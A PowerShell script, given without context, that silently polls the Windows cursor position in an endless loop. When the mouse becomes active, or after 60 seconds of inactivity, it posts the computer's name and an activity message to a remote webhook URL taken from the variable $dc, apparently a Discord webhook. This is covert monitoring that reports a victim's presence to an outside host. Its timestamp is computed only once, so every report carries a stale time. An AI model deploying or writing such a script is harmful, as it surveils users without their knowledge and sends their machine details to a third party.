$whuri = "$dc"

$signature = @'
[DllImport("user32.dll")]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool GetCursorPos(out POINT lpPoint);
[StructLayout(LayoutKind.Sequential)]
public struct POINT
{
    public int X;
    public int Y;
}
'@ 

$timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$outpath = "$env:temp\info.txt"
$cursorType = Add-Type -MemberDefinition $signature -Name "CursorPos" -Namespace "Win32" -PassThru
$prevX = 0
$idleThreshold = New-TimeSpan -Seconds 60
$lastActivityTime = [System.DateTime]::Now
$isActive = $true
$iActive = $true
sleep 1

while ($true) {
    $cursorPos = New-Object Win32.CursorPos+POINT
    [Win32.CursorPos]::GetCursorPos([ref]$cursorPos) | Out-Null
    $currentX = $cursorPos.X
    $currentTime = [System.DateTime]::Now

    if ($currentX -ne $prevX) {
        if ($iActive) {
        $prevX = $currentX
        $lastActivityTime = $currentTime
        
        if ($idleTime -lt $idleThreshold) {
        $msgsys = "[$timestamp] : Mouse is active"
        $escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
        $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsgsys} | ConvertTo-Json
        Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys
        }
        $iActive = $false
    }
}
else {
        $iActive = $true
    }


    $idleTime = $currentTime - $lastActivityTime

    if ($idleTime -ge $idleThreshold) {
        if ($isActive) {
            $msgsys = "[$timestamp] : Mouse has been inactive for 60 seconds"
            $escmsgsys = $msgsys -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
            $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsgsys} | ConvertTo-Json
            Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys
            $isActive = $false
            $iActive = $true
        }
        else {
        }
    }
    else {
        $isActive = $true
    }
    Start-Sleep -Milliseconds 60
}

